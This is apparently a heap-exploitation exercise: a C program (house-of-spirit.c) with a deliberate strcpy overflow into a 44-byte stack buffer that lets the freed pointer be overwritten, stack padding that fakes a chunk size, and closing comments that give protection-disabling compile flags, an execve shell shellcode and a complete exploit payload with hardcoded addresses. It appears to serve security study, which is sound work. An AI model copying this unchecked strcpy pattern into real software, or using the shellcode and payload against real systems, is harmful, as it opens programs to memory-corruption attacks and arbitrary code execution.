#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

void vuln(char *str1, int age)
{
  char *ptr1, name[44];
  int local_age;
  char *ptr2;

  local_age = age;

  ptr1 = (char *) malloc(256);
  printf("\nPTR1 =  %p ", ptr1);
  strcpy(name, str1);
  printf("\nPTR1 =  %p \n", ptr1);

  free(ptr1);

  ptr2 = (char *) malloc(40);
  printf("\nPTR2 =  %p \n", ptr2);

  snprintf(ptr2, 40-1, "%s is %d years old", name, local_age);
  printf("\n%s\n", ptr2);
}

int main(int argc, char *argv[])
{
  int pad[10];
  int i;
  for(i = 0; i < 10; i ++)
  { 
    pad[i] = 0x21;   //to satisfy the next chunk's size
  }


  if (argc == 3)
  {
    vuln(argv[1], atoi(argv[2]));
  }

  return 0;
}

//gcc -fno-stack-protector -z execstack -o spirit house-of-spirit.c
//shellcode "\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80"

//final shellcode "\xeb\x0e\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x88\xf3\xff\xbf\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80"+"a"*8+"\xb0\xf3\xff\xbf\x30"
//use gdb to debug the program.

